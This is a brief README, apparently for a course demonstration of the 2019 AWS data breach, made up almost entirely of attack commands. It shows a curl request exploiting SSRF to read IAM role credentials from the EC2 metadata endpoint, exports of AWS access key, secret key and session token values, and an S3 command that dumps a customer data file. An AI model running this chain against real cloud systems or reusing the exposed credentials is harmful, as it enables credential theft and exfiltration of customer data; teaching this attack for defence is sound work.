# 2019-AWS-Data-Breach-Demo

```
curl http://<EC2_public_ip>>/ssrf.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2_role
```


```shell
export AWS_ACCESS_KEY_ID="ASIAZDZTCACO7BAZ7KEE"
export AWS_SECRET_ACCESS_KEY="S7z6biyOscdzDEVuLLLXa0GwHYRdN89ivkMy/4Dz"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEFYaCXV..."
```

```shell
aws s3 cp s3://jhu-en-650-603/customer.json - | cat
```